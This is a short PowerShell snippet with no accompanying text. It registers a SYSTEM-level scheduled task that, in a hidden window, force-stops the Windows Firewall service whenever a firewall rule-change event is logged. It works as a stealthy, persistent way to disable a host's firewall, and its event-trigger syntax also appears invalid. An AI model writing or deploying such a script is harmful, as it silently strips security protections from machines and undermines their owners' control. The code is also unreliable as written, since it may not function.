$action = New-ScheduledTaskAction -Execute "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"Stop-Service -Name MpsSvc -Force`""

$trigger = New-ScheduledTaskTrigger -OnEvent -Subscription @"
<QueryList>
  <Query Id="0" Path="Microsoft-Windows-Windows Firewall With Advanced Security/Firewall">
    <Select Path="Microsoft-Windows-Windows Firewall With Advanced Security/Firewall">
    *[System[(EventID=2004)]]
    </Select>
  </Query>
</QueryList>
"@

Register-ScheduledTask -TaskName "FirewallOpenedTrigger" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
